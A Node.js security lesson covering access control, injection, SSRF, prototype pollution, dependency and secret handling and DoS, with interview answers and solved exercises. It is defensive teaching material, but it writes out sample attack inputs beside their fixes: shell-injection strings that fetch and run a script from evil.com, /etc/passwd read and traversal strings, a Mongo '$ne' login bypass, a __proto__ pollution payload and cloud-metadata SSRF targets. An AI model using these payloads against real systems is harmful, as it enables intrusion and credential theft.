Security (OWASP for Node) Data & Auth

What you'll master: the vulnerability classes that actually appear in Node services — broken access control, injection beyond SQL, SSRF, prototype pollution, path traversal, dependency risk, and secret handling — plus the defensive posture that catches the ones you did not anticipate. Prerequisites: Authentication, Validation & Error Handling. See also the JavaScript security lesson for browser-side XSS and CSP.

Part 1 — Broken Access Control (the #1 category)

// Authentication answers "who are you". Authorization answers "may you do
// THIS to THIS object". Systems get the first right and the second wrong.

// ❌ IDOR — Insecure Direct Object Reference. The classic:
app.get("/api/orders/:id", requireAuth, async (req, res) => {
  const order = await db.find(req.params.id);
  res.json(order);            // ← authenticated, but is it THEIR order?
});
// Any logged-in user reads every order by iterating ids. This is the single
// most common serious vulnerability in real APIs, and no scanner reliably
// finds it because the request looks completely legitimate.

// ✅ Authorize against the object, not just the route:
app.get("/api/orders/:id", requireAuth, async (req, res) => {
  const order = await db.maybeOne(
    "SELECT * FROM orders WHERE id = $1 AND user_id = $2",
    [req.params.id, req.ctx.user.id]);          // ownership IN the query
  if (!order) throw new NotFound("Order");      // 404, not 403 — see below
  res.json(order);
});
// Putting ownership in the WHERE clause makes the insecure version
// unwritable rather than merely discouraged: there is no code path that
// returns someone else's row.
//
// 404 rather than 403 for objects the user may not see: a 403 confirms the
// record EXISTS, which leaks information (order counts, user ids, whether a
// given email is registered). Reserve 403 for cases where the user already
// knows the resource exists.

// Deny by default. Authorization belongs on the router subtree so a new
// route inherits it, and a test should enumerate registered routes and
// assert each non-public one rejects an anonymous request — that converts
// "we remembered" into "the suite fails if we forget".

// Never trust client-supplied identity or role:
const userId = req.body.userId;         // ❌ attacker sets it to anyone
const userId = req.ctx.user.id;         // ✅ derived from the verified session

Part 2 — Injection Beyond SQL

// COMMAND INJECTION — the most damaging, and easy to write by accident:
import { exec, execFile } from "node:child_process";
exec(`convert ${req.body.file} out.png`);        // ❌ shell metacharacters
// file = "x.png; curl evil.com/s.sh | sh"  → remote code execution
execFile("convert", [req.body.file, "out.png"]); // ✅ no shell, args are data
// execFile/spawn without `shell: true` pass arguments directly to the
// process — there is no shell to interpret ;, |, $(), or backticks. Same
// principle as SQL parameterization: keep data out of the syntax channel.

// NoSQL INJECTION — operators smuggled in as objects:
await User.findOne({ email: req.body.email, password: req.body.password });
// If the body is {"email":"a@b.c","password":{"$ne":null}}, Mongo reads the
// object as an OPERATOR and matches any non-null password. Express parses
// JSON into real objects, so this needs no exotic payload.
// Fix: validate types with a schema (z.string()) before the value ever
// reaches the query — a string cannot become an operator.

// PATH TRAVERSAL:
res.sendFile(path.join("/var/data", req.params.name));   // ❌
// name = "../../etc/passwd" → path.join happily resolves outside the root
const root = "/var/data";
const target = path.resolve(root, req.params.name);
if (!target.startsWith(root + path.sep)) throw new AppError("Bad path", { status: 400 });
// ✅ resolve first, THEN verify containment. Checking for ".." in the input
// is not enough: encodings, symlinks, and absolute paths all bypass it.

// SSRF — Server-Side Request Forgery. Underrated and severe:
await fetch(req.body.url);       // ❌ your server fetches whatever they name
// Attackers target internal addresses your server can reach but they cannot:
//   http://169.254.169.254/latest/meta-data/   → cloud credentials
//   http://localhost:6379                       → your Redis
//   http://10.0.0.5/admin                       → internal services
// Defence: allowlist hosts and schemes, resolve DNS and reject private/
// loopback/link-local ranges, disable redirects (a public URL can redirect
// to a private one), and prefer an egress proxy. Validating the URL string
// alone is insufficient because DNS can resolve a public name to 127.0.0.1.

Part 3 — Prototype Pollution (a Node-specific class)

// JavaScript objects inherit from Object.prototype. If an attacker can write
// to the key "__proto__", they modify that shared prototype — and therefore
// EVERY object in the process.

function merge(target, source) {          // a naive deep merge
  for (const key in source) {
    if (typeof source[key] === "object") {
      target[key] = merge(target[key] ?? {}, source[key]);
    } else {
      target[key] = source[key];          // ← key can be "__proto__"
    }
  }
  return target;
}
merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'));
({}).isAdmin;        // → true. Every object now claims isAdmin.

// Consequences range from authorization bypass (a check for `user.isAdmin`
// on an object that never had the property) to denial of service to RCE when
// a polluted property reaches a template engine or child_process options.

// Defences, in order of strength:
// 1. Do not hand-roll deep merges — the ecosystem versions are hardened.
// 2. Reject dangerous keys explicitly:
const FORBIDDEN = new Set(["__proto__", "constructor", "prototype"]);
if (FORBIDDEN.has(key)) continue;
// 3. Use null-prototype objects for untrusted maps:
const safe = Object.create(null);        // no prototype to pollute
// 4. Object.freeze(Object.prototype) at startup — blunt but effective.
// 5. Validate with a schema that strips unknown keys (the Zod pattern from
//    the validation lesson) — "__proto__" is an unknown key, so it never
//    reaches your merge in the first place. This is why boundary validation
//    keeps paying off against attacks it was not designed for.

// Note JSON.parse itself is safe — it creates an own property named
// "__proto__" rather than setting the prototype. The vulnerability is in
// code that later COPIES those keys onto another object.
Security headers are one line and worth it. app.use(helmet()) sets Content-Security-Policy, X-Content-Type-Options: nosniff, Strict-Transport-Security, X-Frame-Options, and Referrer-Policy with sensible defaults. It also removes X-Powered-By: Express, which tells attackers exactly what you run. None of this substitutes for correct application logic, but it is the cheapest defence-in-depth available and it turns several exploit classes from easy into awkward.

Part 4 — Dependencies: Your Largest Attack Surface

// A typical Node app has ~1,000 transitive dependencies. Every one runs with
// full process privileges: your env vars, your filesystem, your network.

npm audit                    // known CVEs in your tree
npm audit fix                // patch what can be patched safely
npm ci                       // install EXACTLY the lockfile — use in CI/prod
npm install --ignore-scripts // block install-time script execution

// Practices that actually reduce risk:
// 1. COMMIT THE LOCKFILE and use `npm ci` everywhere. Without it, a patch
//    release of a transitive dep can change under you between builds — which
//    is precisely the supply-chain vector.
// 2. Audit lifecycle scripts. `postinstall` runs arbitrary code at install
//    time, before any of your tests. Most compromised-package incidents use
//    exactly this.
// 3. Prefer fewer, larger, well-maintained dependencies over many tiny ones.
//    Each package is a separate maintainer account that can be phished.
// 4. Pin and review updates for anything in the auth or crypto path.
// 5. Check before adding: last publish date, open CVEs, maintainer count,
//    whether it needs native builds. "It has a lot of downloads" is not a
//    security property — popularity is what makes a package worth attacking.
// 6. Automate: Dependabot/Renovate for updates, `npm audit` in CI as a gate.

// Typosquatting is real: `expres`, `lodahs`, `crossenv` have all shipped
// credential stealers. Read the name you typed before running install.

Part 5 — Secrets

// Secrets come from the ENVIRONMENT, never from the repository.
const dbUrl = process.env.DATABASE_URL;
if (!dbUrl) throw new Error("DATABASE_URL is required");   // fail fast at boot
// Validate the whole environment at startup with a schema — a missing secret
// should stop the process immediately, not surface as a confusing error on
// the first request that needs it.

// ❌ Never: hardcoded keys, .env committed to git, secrets in Docker image
//    layers (they persist in the layer even if a later layer deletes them),
//    secrets in CI logs, secrets in error messages returned to clients.

// If a secret is ever committed, it is compromised — permanently. Rewriting
// history does not help: it was cloned, cached, and indexed within minutes.
// The only correct response is to ROTATE the credential.

// Logging is a leak surface people forget:
logger.info({ req.body }, "login attempt");     // ❌ logs the password
logger.info({ user: req.body.email }, "login attempt");   // ✅
// Configure your logger's redaction list for authorization headers, cookies,
// tokens, and password fields — then verify it by reading actual log output,
// because redaction config that silently does not match your field names is
// worse than none: it creates confidence without protection.

// Timing-safe comparison for any secret you compare yourself:
import { timingSafeEqual } from "node:crypto";
function safeEqual(a, b) {
  const ab = Buffer.from(a), bb = Buffer.from(b);
  if (ab.length !== bb.length) return false;    // length still leaks; compare
  return timingSafeEqual(ab, bb);               // hashes if that matters
}
// `===` on strings short-circuits at the first differing byte, so response
// time reveals how many leading characters were correct — enough to recover
// an API key one byte at a time.

Part 6 — Denial of Service & Resource Limits

// Every unbounded resource is a DoS vector. Bound all of them:
app.use(express.json({ limit: "100kb" }));         // body size
app.use(rateLimit({ windowMs: 60_000, limit: 100 }));   // request rate
server.requestTimeout = 30_000;                     // slow requests
server.headersTimeout = 10_000;                     // slowloris
// plus: pagination caps, upload size limits, query timeouts in the database,
// AbortSignal.timeout on every outbound fetch, and bounded concurrency.

// ReDoS — catastrophic backtracking. A regex vulnerability, not a library one:
const re = /^(a+)+$/;              // nested quantifier
re.test("aaaaaaaaaaaaaaaaaaaaaaaaaaaaX");    // exponential time → event loop
// One request freezes the ENTIRE process, because the event loop is single
// threaded — this is why ReDoS is more severe in Node than in a thread-per-
// request runtime. Avoid nested quantifiers over user input; prefer explicit
// bounds ({1,64}) and validate length BEFORE matching. Tools like
// safe-regex or the linter rule catch the obvious cases.

// Blocking the event loop is itself the DoS:
const hash = crypto.pbkdf2Sync(pw, salt, 600_000, 32, "sha512");   // ❌ blocks
await promisify(crypto.pbkdf2)(pw, salt, 600_000, 32, "sha512");   // ✅ pool
// Sync crypto, sync fs, JSON.parse on huge payloads, and big synchronous
// loops all stop every other request. Move CPU-bound work to worker threads
// (see the scaling lesson) and always prefer the async form.

Interview Questions

Beginner: What is IDOR and how do you prevent it?

Insecure Direct Object Reference: an endpoint authenticates the caller but does not verify they own the object being addressed, so any logged-in user can read or modify another user's records by changing an id. The fix is to make ownership part of the lookup itself — WHERE id = $1 AND user_id = $2 — so no code path can return another user's row. Returning 404 rather than 403 avoids confirming that the record exists. It is the most common serious API vulnerability precisely because the malicious request is indistinguishable from a legitimate one, so scanners and logs do not flag it.

Beginner: Why is execFile safer than exec?

exec runs the command through a shell, so shell metacharacters in interpolated input — semicolons, pipes, backticks, $() — are interpreted as syntax and can run arbitrary commands. execFile (and spawn without shell: true) passes the argument array directly to the process, so there is no shell to interpret anything and user input can only ever be data. It is the same separation-of-code-and-data principle behind parameterized SQL.

Mid: Explain prototype pollution and how a schema prevents it.

JavaScript objects inherit from Object.prototype, so code that copies attacker-controlled keys onto an object — a naive deep merge, for example — can write to __proto__ and modify that shared prototype. Every object in the process then appears to have the injected property, which can bypass authorization checks that test for a flag, cause denial of service, or reach code execution if the property lands somewhere sensitive. Schema validation prevents it because __proto__ is an unknown key: parsing input against a schema that strips unknown keys means the dangerous key never reaches the merge. That is a good illustration of why boundary validation keeps paying off against attacks it was not specifically designed to stop.

Mid: What is SSRF and why is validating the URL string insufficient?

Server-Side Request Forgery is making the server issue a request to an attacker-chosen destination, which is dangerous because the server can reach things the attacker cannot: cloud metadata endpoints holding credentials, internal admin panels, databases bound to localhost. String validation is insufficient because the mapping from name to address happens later and is attacker-influenced. A perfectly public-looking hostname can resolve to 127.0.0.1 or 169.254.169.254 via DNS the attacker controls, and a public URL can respond with a redirect to an internal one. Robust defence means resolving the address and rejecting private, loopback, and link-local ranges, re-checking after any redirect (or disabling redirects), allowlisting hosts where possible, and ideally routing outbound traffic through an egress proxy that enforces the policy independently of application code.

Senior: A dependency you use was compromised and published a malicious version. Walk through your response.

First, determine exposure: check the lockfile for whether the malicious version was ever resolved, and check build logs for when it could have been installed. If npm ci with a committed lockfile is used everywhere, the window is likely narrow or nonexistent — which is the payoff for that practice. Second, contain: pin to a known-good version, rebuild and redeploy, and if any build ran the bad version, treat that build environment as compromised. Third, assume credential theft, because install scripts run with full access to environment variables — rotate every secret that was present in any affected build or runtime environment, which is why secrets should be short-lived and scoped rather than long-lived god-credentials. Fourth, investigate what the payload did: read the published code, look for outbound connections in egress logs from build agents and production, and check for persistence. Fifth, review whether the dependency was necessary at all — supply-chain incidents are a good forcing function for removing packages that wrap a few lines of standard library. Longer term this argues for --ignore-scripts with an explicit allowlist, isolated build environments without production credentials, egress restrictions on build agents, and dependency review as part of code review. The strategic point is that you cannot audit a thousand transitive dependencies, so the defence has to be limiting blast radius rather than preventing every compromise.

Senior: How would you approach security for a Node service handling payment data, beyond writing correct code?

Correct code is necessary but is the smallest part. I would start by reducing scope: not storing card data at all, using a payment provider's tokenization so the sensitive data never touches our systems, because the cheapest way to secure data is not to hold it. Then defence in depth in layers that fail independently: strict input validation at the boundary, parameterized queries, authorization on every object access, least-privilege database credentials so the application cannot read tables it does not need, network segmentation so the service cannot reach anything it has no business reaching, and secrets from a managed store with short-lived, automatically rotated credentials. Operationally, audit logging of every access to sensitive records with tamper-evident storage, alerting on anomalous access patterns rather than only on errors, and a tested incident response plan including revocation — the auth lesson's point that response capability must exist before the incident. For assurance: dependency scanning and SAST in CI as gates rather than reports, regular third-party penetration testing, and a threat model revisited when the architecture changes. There are compliance obligations here too — PCI DSS scope, retention limits, and encryption requirements — which I would treat as a floor rather than a goal. The organizing principle is assuming any single control will fail and asking what the blast radius is when it does: that question drives segmentation, least privilege, short-lived credentials, and monitoring far more usefully than a checklist of vulnerabilities.

🏋️ Graded Exercises

1 (easy): Fix the IDOR: app.get("/invoices/:id", requireAuth, async (req,res) => res.json(await db.find(req.params.id)))
Solution 
app.get("/invoices/:id", requireAuth, async (req, res) => {
  const invoice = await db.maybeOne(
    "SELECT * FROM invoices WHERE id = $1 AND user_id = $2",
    [req.params.id, req.ctx.user.id]);
  if (!invoice) throw new NotFound("Invoice");     // 404, not 403
  res.json(invoice);
});
// Ownership lives in the query, so there is no code path that returns
// another user's invoice. 404 avoids confirming the id exists.
2 (easy): Why is exec(`git clone ${url}`) dangerous, and what is the fix?
Solution 
// exec spawns a SHELL, so metacharacters in `url` become syntax:
//   url = "repo.git; curl evil.com/s.sh | sh"   → arbitrary code execution
//   url = "$(cat /etc/passwd)"                  → command substitution
execFile("git", ["clone", url, dest]);
// No shell: `url` is a single argv entry regardless of its contents.
// Still validate it — execFile stops injection, not a malicious clone target.
3 (medium): Write a safe file-download handler rooted at /var/data.
Solution 
import path from "node:path";

const ROOT = path.resolve("/var/data");

app.get("/files/:name", requireAuth, async (req, res) => {
  const target = path.resolve(ROOT, req.params.name);

  // Containment check AFTER resolution — this is the whole defence.
  if (target !== ROOT && !target.startsWith(ROOT + path.sep)) {
    throw new AppError("Invalid path", { status: 400 });
  }
  // Optional but wise: confirm it is a regular file, not a symlink out.
  const st = await fs.lstat(target).catch(() => null);
  if (!st?.isFile()) throw new NotFound("File");

  res.sendFile(target);
});
// Why not just reject input containing "..": percent-encodings, backslashes
// on Windows, absolute paths, and symlinks all evade that check. Resolving
// first collapses every representation into one canonical path, and THEN
// the prefix test is meaningful.
4 (medium): Show how a login could be bypassed by NoSQL injection, and fix it.
Solution 
// Vulnerable:
const user = await User.findOne({ email: req.body.email, password: req.body.password });
// POST {"email":"admin@x.com","password":{"$ne":null}}
// Express parses JSON into a real object, so Mongo receives an OPERATOR:
//   { password: { $ne: null } }  → "any non-null password" → login as admin.

// Fix 1 — schema validation makes the types impossible to subvert:
const Login = z.object({ email: z.string().email(), password: z.string().min(1) });
const { email, password } = Login.parse(req.body);   // objects rejected here

// Fix 2 — never query the password at all. Fetch by email, then verify the
// hash in application code (the auth lesson's pattern):
const user = await User.findOne({ email });
const ok = await argon2.verify(user?.password_hash ?? DUMMY_HASH, password);
// This is better regardless: a password should never be a query predicate,
// because comparing it in the database means storing it comparably.
5 (hard): Write an SSRF-resistant fetch for user-supplied URLs.
Solution 
import dns from "node:dns/promises";
import net from "node:net";

function isPrivate(ip) {
  if (net.isIPv4(ip)) {
    const [a, b] = ip.split(".").map(Number);
    return a === 10 || a === 127 || a === 0 ||
           (a === 172 && b >= 16 && b <= 31) ||
           (a === 192 && b === 168) ||
           (a === 169 && b === 254);          // cloud metadata lives here
  }
  return ip === "::1" || ip.startsWith("fc") || ip.startsWith("fd") ||
         ip.startsWith("fe80");
}

export async function safeFetch(rawUrl) {
  const url = new URL(rawUrl);
  if (!["http:", "https:"].includes(url.protocol)) {
    throw new AppError("Unsupported scheme", { status: 400 });
  }
  const { address } = await dns.lookup(url.hostname);
  if (isPrivate(address)) throw new AppError("Blocked address", { status: 400 });

  return fetch(url, {
    redirect: "manual",                    // a public URL can redirect inward
    signal: AbortSignal.timeout(5_000),
  });
}

// Known limitation worth stating in review: this is still racy. The address
// is resolved once here and again by fetch, so an attacker controlling DNS
// can return a public IP to the check and a private one to the actual
// request (DNS rebinding). Closing that properly requires pinning the
// resolved address for the connection (a custom agent/lookup) or, more
// practically, enforcing the policy at the network layer with an egress
// proxy or firewall rules. Application-level SSRF defence is worth having,
// but network-level egress control is what actually holds.
6 (hard): A code review shows Object.assign({}, defaults, JSON.parse(req.body.config)). Assess the risk and propose a fix.
Solution 
// Assess: Object.assign copies only OWN ENUMERABLE properties one level
// deep, and assigning the own key "__proto__" via Object.assign does set the
// target's prototype — so this IS reachable prototype pollution, and even
// where it is not, attacker-controlled config keys reaching application
// behaviour is its own problem (unexpected options, overridden internals).
//
// It is also a mass-assignment issue: whatever keys the client sends land in
// the config object, including ones that were never meant to be caller-
// controllable.

// Fix — validate against a schema that strips unknown keys:
const Config = z.object({
  theme: z.enum(["light", "dark"]).default("light"),
  pageSize: z.coerce.number().int().min(1).max(100).default(25),
}).strict();                       // reject unknown keys outright

const config = { ...defaults, ...Config.parse(JSON.parse(req.body.config)) };
// "__proto__" is not in the schema, so it is stripped (or rejected under
// .strict()) before any copy happens. The allowlist is the defence: you
// enumerate what is permitted rather than trying to enumerate what is
// dangerous, which is the only version that stays correct as the attack
// surface evolves.

// Defence in depth if untrusted merges are unavoidable elsewhere:
//   Object.freeze(Object.prototype)            // at startup
//   const cfg = Object.create(null)            // nothing to pollute
// And never hand-roll a recursive deep merge over untrusted input.

🎯 Key Takeaways

  • Broken access control is the most common serious flaw — authorize the object, not just the route, by putting ownership in the query.
  • Identity must come from the verified session, never from a request field the client controls.
  • Injection is one pattern across many channels: keep data out of the syntax channel, whether that is SQL, a shell, a Mongo query, or a file path.
  • SSRF defence needs address resolution and private-range blocking, not string validation — and network-level egress control to be genuinely reliable.
  • Prototype pollution is Node-specific and is largely neutralized by schema validation that strips unknown keys.
  • Dependencies run with full process privileges; commit lockfiles, use npm ci, and treat install scripts as executable code.
  • A committed secret is compromised permanently — rotate it, because history rewriting does not un-clone it.
  • Compare secrets with timingSafeEqual; === leaks how many leading bytes matched.
  • Every unbounded resource is a DoS vector, and in a single-threaded runtime one blocked request blocks all of them.
  • Assume any single control fails and design for blast radius — least privilege, segmentation, short-lived credentials, and monitoring.
